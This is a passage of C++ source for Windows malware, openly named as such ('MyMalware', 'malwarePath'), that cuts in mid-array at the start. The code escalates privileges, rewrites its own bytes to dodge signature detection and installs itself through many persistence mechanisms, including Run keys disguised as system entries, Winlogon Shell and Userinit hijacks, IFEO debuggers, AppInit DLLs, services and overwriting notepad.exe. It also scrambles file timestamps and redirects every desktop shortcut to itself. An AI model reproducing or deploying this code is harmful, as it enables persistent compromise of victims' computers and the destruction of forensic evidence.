    L"dwm.exe",
    L"explorer.exe",
    L"conhost.exe",
    L"ctfmon.exe"
};
struct PersistenceEntry {
    HKEY root;
    std::wstring subkey;
    std::wstring valueName;
    bool requireAdmin;
    bool useNullPrefix;
    bool isService;
    bool isShell;
};
std::vector<PersistenceEntry> userEntries = {
    { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      L"MicrosoftEdgeUpdate", false, false, false, false },
    { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
      L"OneDriveSetup", false, false, false, false },
    { HKEY_CURRENT_USER, L"Environment",
      L"UserInitMprLogonScript", false, false, false, false },
};
std::vector<PersistenceEntry> adminEntries = {
    { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
      L"SecurityHealth", true, true, false, false },
    { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
      L"Shell", true, false, false, true },
    { HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services",
      L"", true, false, true, false }
};

BOOL CopySelfToPath(const wchar_t* destPath) {
    wchar_t currentPath[MAX_PATH];
    if (!GetModuleFileNameW(NULL, currentPath, MAX_PATH))
        return FALSE;
    DeleteFileW(destPath);
    if (!CopyFileW(currentPath, destPath, FALSE))
        return FALSE;
    SetFileAttributesW(destPath, FILE_ATTRIBUTE_HIDDEN);
    return TRUE;
}
BOOL SetRegistryString(HKEY root, const wchar_t* subkey, const wchar_t* valueName,
                       const wchar_t* value, BOOL useNullPrefix = FALSE) {
    HKEY hKey;
    if (RegCreateKeyExW(root, subkey, 0, NULL, 0, KEY_SET_VALUE,
                       NULL, &hKey, NULL) != ERROR_SUCCESS)
        return FALSE;
    std::wstring finalName = valueName;
    if (useNullPrefix) {
        std::wstring hidden;
        hidden.push_back(L'\0');
        hidden += valueName;
        finalName = hidden;
    }
    const wchar_t* lpName = finalName.empty() ? NULL : finalName.c_str();
    DWORD cbData = (DWORD)((wcslen(value) + 1) * sizeof(wchar_t));
    LONG result = RegSetValueExW(hKey, lpName, 0, REG_SZ,
                                 (const BYTE*)value, cbData);
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}
void EnsureExplorerRunning() {
    if (FindWindowW(L"Shell_TrayWnd", NULL) != NULL)
        return;
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring explorerPath = std::wstring(sysDir) + L"\\explorer.exe";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (CreateProcessW(explorerPath.c_str(), NULL, NULL, NULL, FALSE,
                       0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}
BOOL CreatePersistenceService(const wchar_t* serviceName, const wchar_t* binaryPath) {
    SC_HANDLE hSCManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return FALSE;
    SC_HANDLE hService = CreateServiceW(
        hSCManager, serviceName, serviceName,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        binaryPath, NULL, NULL, NULL, NULL, NULL);
    if (hService) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        return TRUE;
    }
    if (GetLastError() == ERROR_SERVICE_EXISTS) {
        hService = OpenServiceW(hSCManager, serviceName, SERVICE_CHANGE_CONFIG);
        if (hService) {
            ChangeServiceConfigW(hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
                                 SERVICE_NO_CHANGE, binaryPath,
                                 NULL, NULL, NULL, NULL, NULL, NULL);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return TRUE;
        }
    }
    CloseServiceHandle(hSCManager);
    return FALSE;
}


struct PolymorphicData {
    char marker[16];
    int data[1000];
};
PolymorphicData poly = { "POLYMORPHIC01", {0} };


bool IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return false;
    TOKEN_ELEVATION elevation;
    DWORD dwSize = 0;
    bool bElevated = false;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        bElevated = (elevation.TokenIsElevated != 0);
    }
    CloseHandle(hToken);
    return bElevated;
}
bool ElevateSelf() {
    wchar_t exePath[MAX_PATH] = {0};
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        return false;
    }
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = exePath;
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;
    if (!ShellExecuteExW(&sei)) {
        return false;
    }
    return true;
}
void MakePolymorphic() {
    char selfPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, selfPath, MAX_PATH) == 0)
        return;
    char tempPath[MAX_PATH];
    strcpy_s(tempPath, selfPath);
    strcat_s(tempPath, ".tmp");
    if (!CopyFileA(selfPath, tempPath, FALSE))
        return;
    HANDLE hFile = CreateFileA(tempPath, GENERIC_READ | GENERIC_WRITE,
                               0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DeleteFileA(tempPath);
        return;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        DeleteFileA(tempPath);
        return;
    }
    BYTE* buffer = (BYTE*)VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        DeleteFileA(tempPath);
        return;
    }
    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        DeleteFileA(tempPath);
        return;
    }
    char marker[16];
    marker[0]='P'; marker[1]='O'; marker[2]='L'; marker[3]='Y';
    marker[4]='M'; marker[5]='O'; marker[6]='R'; marker[7]='P';
    marker[8]='H'; marker[9]='I'; marker[10]='C'; marker[11]='0'; marker[12]='1';
    marker[13]='\0';
    const DWORD markerLen = 13;
    BYTE* found = NULL;
    for (DWORD i = 0; i <= fileSize - markerLen; i++) {
        if (memcmp(buffer + i, marker, markerLen) == 0) {
            found = buffer + i;
            break;
        }
    }
    if (!found) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        DeleteFileA(tempPath);
        return;
    }
    int* polyArray = (int*)(found + markerLen);
    HCRYPTPROV hProv = 0;
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL,
                             CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
        CryptGenRandom(hProv, 1000 * sizeof(int), (BYTE*)polyArray);
        CryptReleaseContext(hProv, 0);
    } else {
        srand(GetTickCount());
        for (int i = 0; i < 1000; i++)
            polyArray[i] = rand();
    }
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD written;
    if (!WriteFile(hFile, buffer, fileSize, &written, NULL) || written != fileSize) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        DeleteFileA(tempPath);
        return;
    }
    CloseHandle(hFile);
    VirtualFree(buffer, 0, MEM_RELEASE);
    if (!MoveFileExA(tempPath, selfPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT)) {
        CopyFileA(tempPath, selfPath, FALSE);
        DeleteFileA(tempPath);
    }
}
FILETIME GenerateRandomFileTime() {
    SYSTEMTIME stStart = {0};
    stStart.wYear = 1990; stStart.wMonth = 1; stStart.wDay = 1;
    FILETIME ftStart;
    SystemTimeToFileTime(&stStart, &ftStart);
    SYSTEMTIME stEnd = {0};
    stEnd.wYear = 2030; stEnd.wMonth = 12; stEnd.wDay = 31;
    stEnd.wHour = 23; stEnd.wMinute = 59; stEnd.wSecond = 59;
    FILETIME ftEnd;
    SystemTimeToFileTime(&stEnd, &ftEnd);
    ULARGE_INTEGER ulStart, ulEnd;
    ulStart.LowPart = ftStart.dwLowDateTime;
    ulStart.HighPart = ftStart.dwHighDateTime;
    ulEnd.LowPart = ftEnd.dwLowDateTime;
    ulEnd.HighPart = ftEnd.dwHighDateTime;
    std::random_device rd;
    std::mt19937_64 gen(rd());
    std::uniform_int_distribution<unsigned long long> dist(ulStart.QuadPart, ulEnd.QuadPart);
    ULARGE_INTEGER ulResult;
    ulResult.QuadPart = dist(gen);
    FILETIME ft;
    ft.dwLowDateTime = ulResult.LowPart;
    ft.dwHighDateTime = ulResult.HighPart;
    return ft;
}
bool SetRandomFileTimesW(const std::wstring& path) {
    FILETIME ft = GenerateRandomFileTime();
    std::wstring longPath = L"\\\\?\\" + path;
    HANDLE hFile = CreateFileW(longPath.c_str(),
                               FILE_WRITE_ATTRIBUTES,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               NULL,
                               OPEN_EXISTING,
                               FILE_FLAG_BACKUP_SEMANTICS,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        hFile = CreateFileW(path.c_str(),
                            FILE_WRITE_ATTRIBUTES,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL,
                            OPEN_EXISTING,
                            FILE_FLAG_BACKUP_SEMANTICS,
                            NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            return false;
    }
    BOOL ok = SetFileTime(hFile, &ft, &ft, &ft);
    CloseHandle(hFile);
    return ok != 0;
}
void TimestompFolder(const std::wstring& folder, bool skipSystemDirs,
                     int maxDepth, int& filesProcessed, int maxFiles) {
    if (maxDepth <= 0 || filesProcessed >= maxFiles)
        return;
    std::wstring searchPath = folder + L"\\*";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE)
        return;
    do {
        if (filesProcessed >= maxFiles)
            break;
        std::wstring name = findData.cFileName;
        if (name == L"." || name == L"..")
            continue;
        std::wstring fullPath = folder + L"\\" + name;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
            continue;
        if (skipSystemDirs) {
            std::wstring lower = fullPath;
            for (auto& c : lower) c = towlower(c);
            if (lower.find(L"\\windows\\") != std::wstring::npos ||
                lower.find(L"\\program files\\") != std::wstring::npos ||
                lower.find(L"\\program files (x86)\\") != std::wstring::npos ||
                lower.find(L"\\programdata\\microsoft\\") != std::wstring::npos ||
                lower.find(L"\\boot\\") != std::wstring::npos ||
                lower.find(L"\\recovery\\") != std::wstring::npos ||
                lower.find(L"\\system volume information\\") != std::wstring::npos ||
                lower.find(L"\\$recycle.bin\\") != std::wstring::npos) {
                continue;
            }
        }
        if (SetRandomFileTimesW(fullPath)) {
            filesProcessed++;
        }
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TimestompFolder(fullPath, skipSystemDirs, maxDepth - 1,
                            filesProcessed, maxFiles);
        }
    } while (FindNextFileW(hFind, &findData) != 0);
    FindClose(hFind);
}
void TimestompAllAccessibleFiles(bool skipSystemDirs = true) {
    std::vector<std::wstring> targetDirs;
    wchar_t appData[MAX_PATH];
    wchar_t localAppData[MAX_PATH];
    wchar_t tempPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData) == S_OK)
        targetDirs.push_back(appData);
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) == S_OK)
        targetDirs.push_back(localAppData);
    if (GetTempPathW(MAX_PATH, tempPath) > 0)
        targetDirs.push_back(tempPath);
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) > 0) {
        std::wstring exeDir = exePath;
        size_t pos = exeDir.find_last_of(L'\\');
        if (pos != std::wstring::npos) {
            exeDir = exeDir.substr(0, pos);
            targetDirs.push_back(exeDir);
        }
    }
    const int maxDepth = 5;
    const int maxFiles = 2000;
    int filesProcessed = 0;
    for (const auto& dir : targetDirs) {
        TimestompFolder(dir, skipSystemDirs, maxDepth, filesProcessed, maxFiles);
        if (filesProcessed >= maxFiles)
            break;
    }
}
BOOL InstallRunHKLMHidden(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"SecurityHealth", malwarePath, TRUE);
}
BOOL InstallRunHidden(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        L"SecurityHealth", malwarePath, TRUE);
}
BOOL InstallRunOnce(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        L"OneDriveSetup", malwarePath, FALSE);
}
BOOL InstallUserInit(const wchar_t* malwarePath) {
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, malwarePath);
    wchar_t* slash = wcsrchr(dir, L'\\');
    if (slash) *slash = 0;
    wchar_t scriptPath[MAX_PATH];
    swprintf_s(scriptPath, L"%ls\\init.cmd", dir);
    HANDLE hFile = CreateFileW(scriptPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    wchar_t cmd[1024];
    swprintf_s(cmd, L"@echo off\r\nstart \"\" \"%ls\"\r\n", malwarePath);
    DWORD written;
    BOOL ok = WriteFile(hFile, cmd, (DWORD)(wcslen(cmd)*sizeof(wchar_t)), &written, NULL);
    CloseHandle(hFile);
    if (!ok) return FALSE;
    return SetRegistryString(HKEY_CURRENT_USER,
        L"Environment", L"UserInitMprLogonScript", scriptPath, FALSE);
}
BOOL InstallScreensaver(const wchar_t* malwarePath) {
    wchar_t dir[MAX_PATH];
    wcscpy_s(dir, malwarePath);
    wchar_t* slash = wcsrchr(dir, L'\\');
    if (slash) *slash = 0;
    wchar_t scrPath[MAX_PATH];
    swprintf_s(scrPath, L"%ls\\screensaver.scr", dir);
    if (!CopySelfToPath(scrPath)) return FALSE;
    BOOL ok = TRUE;
    ok &= SetRegistryString(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"SCRNSAVE.EXE", scrPath, FALSE);
    ok &= SetRegistryString(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"ScreenSaveActive", L"1", FALSE);
    ok &= SetRegistryString(HKEY_CURRENT_USER, L"Control Panel\\Desktop", L"ScreenSaveTimeout", L"60", FALSE);
    return ok;
}
BOOL InstallStartupFolder(const wchar_t* malwarePath) {
    wchar_t startupPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK)
        return FALSE;
    wchar_t dest[MAX_PATH];
    swprintf_s(dest, L"%ls\\update.exe", startupPath);
    return CopySelfToPath(dest);
}
BOOL InstallIfeoUser(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe",
        L"Debugger", malwarePath, FALSE);
}
BOOL InstallAppPaths(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\winword.exe",
        L"", malwarePath, FALSE);
}
BOOL InstallProtocolHandler(const wchar_t* malwarePath) {
    BOOL ok = TRUE;
    ok &= SetRegistryString(HKEY_CURRENT_USER, L"Software\\Classes\\myapp", L"", L"URL:MyApp Protocol", FALSE);
    ok &= SetRegistryString(HKEY_CURRENT_USER, L"Software\\Classes\\myapp", L"URL Protocol", L"", FALSE);
    ok &= SetRegistryString(HKEY_CURRENT_USER,
        L"Software\\Classes\\myapp\\shell\\open\\command",
        L"", malwarePath, FALSE);
    return ok;
}
BOOL InstallScheduledTaskUser(const wchar_t* malwarePath) {
    wchar_t cmd[1024];
    swprintf_s(cmd, L"schtasks /create /tn \"MyTask\" /tr \"%ls\" /sc onlogon /f", malwarePath);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    return CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}
BOOL InstallShell(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"Shell", malwarePath, FALSE);
}
BOOL InstallService(const wchar_t* malwarePath) {
    return CreatePersistenceService(L"Windows Update Helper", malwarePath);
}
BOOL InstallIfeoAdmin(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe",
        L"Debugger", malwarePath, FALSE);
}
BOOL InstallWinlogonUserinit(const wchar_t* malwarePath) {
    HKEY hKey;
    wchar_t userinit[512];
    DWORD size = sizeof(userinit);
    if (RegGetValueW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"Userinit", RRF_RT_REG_SZ, NULL, userinit, &size) == ERROR_SUCCESS) {
        wcscat_s(userinit, L",");
        wcscat_s(userinit, malwarePath);
    } else {
        wcscpy_s(userinit, malwarePath);
    }
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        L"Userinit", userinit, FALSE);
}
BOOL InstallAppCertDlls(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
        L"AppCertDlls", malwarePath, FALSE);
}
BOOL InstallAppInitDlls(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
        L"AppInit_DLLs", malwarePath, FALSE);
}
BOOL InstallBootExecute(const wchar_t* malwarePath) {
    return SetRegistryString(HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Session Manager",
        L"BootExecute", malwarePath, FALSE);
}
BOOL InstallScheduledTaskSystem(const wchar_t* malwarePath) {
    wchar_t cmd[1024];
    swprintf_s(cmd, L"schtasks /create /tn \"SysTask\" /tr \"%ls\" /sc onstart /ru SYSTEM /f", malwarePath);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    return CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}
BOOL InstallImageHijack(const wchar_t* malwarePath) {
    wchar_t sysDir[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    wchar_t dest[MAX_PATH];
    swprintf_s(dest, L"%ls\\notepad.exe", sysDir);
    return CopySelfToPath(dest);
}
enum PersistenceMethod {
    METHOD_RUN_HIDDEN,
    METHOD_RUNONCE,
    METHOD_USERINIT,
    METHOD_SCREENSAVER,
    METHOD_STARTUP_FOLDER,
    METHOD_IFEO_USER,
    METHOD_APP_PATHS,
    METHOD_PROTOCOL_HANDLER,
    METHOD_SCHEDULED_TASK_USER,
    METHOD_SHELL,
    METHOD_SERVICE,
    METHOD_IFEO_ADMIN,
    METHOD_WINLOGON_USERINIT,
    METHOD_APPCERT_DLLS,
    METHOD_APPINIT_DLLS,
    METHOD_BOOTEXECUTE,
    METHOD_SCHEDULED_TASK_SYSTEM,
    METHOD_IMAGE_HIJACK,
};
BOOL InstallPersistenceRandom(BOOL isAdmin, const wchar_t* malwarePath) {
    srand((unsigned)time(NULL));
    if (isAdmin) {
        PersistenceMethod methods[] = {
            METHOD_SHELL,
            METHOD_SERVICE,
            METHOD_IFEO_ADMIN,
            METHOD_WINLOGON_USERINIT,
            METHOD_APPCERT_DLLS,
            METHOD_APPINIT_DLLS,
            METHOD_BOOTEXECUTE,
            METHOD_SCHEDULED_TASK_SYSTEM,
            METHOD_IMAGE_HIJACK
        };
        int idx = rand() % 9;
        switch (methods[idx]) {
            case METHOD_SHELL: return InstallShell(malwarePath);
            case METHOD_SERVICE: return InstallService(malwarePath);
            case METHOD_IFEO_ADMIN: return InstallIfeoAdmin(malwarePath);
            case METHOD_WINLOGON_USERINIT: return InstallWinlogonUserinit(malwarePath);
            case METHOD_APPCERT_DLLS: return InstallAppCertDlls(malwarePath);
            case METHOD_APPINIT_DLLS: return InstallAppInitDlls(malwarePath);
            case METHOD_BOOTEXECUTE: return InstallBootExecute(malwarePath);
            case METHOD_SCHEDULED_TASK_SYSTEM: return InstallScheduledTaskSystem(malwarePath);
            case METHOD_IMAGE_HIJACK: return InstallImageHijack(malwarePath);
        }
    } else {
        PersistenceMethod methods[] = {
            METHOD_RUN_HIDDEN,
            METHOD_RUNONCE,
            METHOD_USERINIT,
            METHOD_SCREENSAVER,
            METHOD_STARTUP_FOLDER,
            METHOD_IFEO_USER,
            METHOD_APP_PATHS,
            METHOD_PROTOCOL_HANDLER,
            METHOD_SCHEDULED_TASK_USER
        };
        int idx = rand() % 9;
        switch (methods[idx]) {
            case METHOD_RUN_HIDDEN: return InstallRunHidden(malwarePath);
            case METHOD_RUNONCE: return InstallRunOnce(malwarePath);
            case METHOD_USERINIT: return InstallUserInit(malwarePath);
            case METHOD_SCREENSAVER: return InstallScreensaver(malwarePath);
            case METHOD_STARTUP_FOLDER: return InstallStartupFolder(malwarePath);
            case METHOD_IFEO_USER: return InstallIfeoUser(malwarePath);
            case METHOD_APP_PATHS: return InstallAppPaths(malwarePath);
            case METHOD_PROTOCOL_HANDLER: return InstallProtocolHandler(malwarePath);
            case METHOD_SCHEDULED_TASK_USER: return InstallScheduledTaskUser(malwarePath);
        }
    }
    return FALSE;
}
bool IsInstalledFlagSet() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\MyMalware", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD installed = 0;
    DWORD size = sizeof(installed);
    RegQueryValueExW(hKey, L"Installed", NULL, NULL, (BYTE*)&installed, &size);
    RegCloseKey(hKey);
    return installed != 0;
}
void SetInstalledFlag() {
    HKEY hKey;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\MyMalware", 0, NULL, 0,
                        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        DWORD installed = 1;
        RegSetValueExW(hKey, L"Installed", 0, REG_DWORD, (BYTE*)&installed, sizeof(installed));
        RegCloseKey(hKey);
    }
}
bool GetShortcutInfo(const std::wstring& shortcutPath,
                     std::wstring& targetPath,
                     std::wstring& iconPath,
                     int& iconIndex)
{
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    IShellLinkW* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                          IID_IShellLinkW, (void**)&pShellLink);
    if (SUCCEEDED(hr)) {
        hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
        if (SUCCEEDED(hr)) {
            hr = pPersistFile->Load(shortcutPath.c_str(), STGM_READ);
            if (SUCCEEDED(hr)) {
                WCHAR buf[MAX_PATH];
                if (SUCCEEDED(pShellLink->GetPath(buf, MAX_PATH, NULL, SLGP_UNCPRIORITY))) {
                    targetPath = buf;
                }
                int idx = 0;
                if (SUCCEEDED(pShellLink->GetIconLocation(buf, MAX_PATH, &idx))) {
                    iconPath = buf;
                    iconIndex = idx;
                }
            }
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}
bool ModifyShortcut(const std::wstring& shortcutPath,
                    const std::wstring& targetPath,
                    const std::wstring& arguments = L"",
                    const std::wstring& description = L"",
                    const std::wstring& iconPath = L"",
                    int iconIndex = 0)
{
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;
    IShellLinkW* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;
    hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
                          IID_IShellLinkW, (void**)&pShellLink);
    if (SUCCEEDED(hr)) {
        pShellLink->SetPath(targetPath.c_str());
        if (!arguments.empty())
            pShellLink->SetArguments(arguments.c_str());
        pShellLink->SetDescription(description.c_str());
        if (!iconPath.empty())
            pShellLink->SetIconLocation(iconPath.c_str(), iconIndex);
        hr = pShellLink->QueryInterface(IID_IPersistFile, (void**)&pPersistFile);
        if (SUCCEEDED(hr)) {
            hr = pPersistFile->Save(shortcutPath.c_str(), TRUE);
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}
void HijackAllShortcuts(const wchar_t* malwarePath)
{
    WCHAR desktopPath[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath) != S_OK)
        return;
    std::wstring searchPath = std::wstring(desktopPath) + L"\\*.lnk";
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;
    std::wstring malware(malwarePath);
    do {
        std::wstring shortcutPath = std::wstring(desktopPath) + L"\\" + findData.cFileName;
        std::wstring originalTarget, originalIcon;
        int iconIndex = 0;
        if (GetShortcutInfo(shortcutPath, originalTarget, originalIcon, iconIndex)) {
            if (originalIcon.empty()) {
                originalIcon = originalTarget;
            }
            ModifyShortcut(shortcutPath, malware, L"", L"", originalIcon, iconIndex);
        }
    } while (FindNextFileW(hFind, &findData) != 0);
    FindClose(hFind);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    if (!IsElevated()) {
        if (ElevateSelf()) {
            return 0;
        }
    }
    MakePolymorphic();
    wchar_t malwarePath[MAX_PATH];
    GetModuleFileNameW(NULL, malwarePath, MAX_PATH);
    if (!IsInstalledFlagSet()) {
        bool isAdmin = IsElevated();
        if (!isAdmin) {
            HijackAllShortcuts(malwarePath);
            TimestompAllAccessibleFiles(false);
            
            return 0;
        }
        EnsureExplorerRunning();
        InstallPersistenceRandom(true, malwarePath);
        SetInstalledFlag();
        PerformFullSystemDowngrade();
        OpenAttackVectors();
        TimestompAllAccessibleFiles(true);
        return 0;
    } else {
        return 0;
    }
}
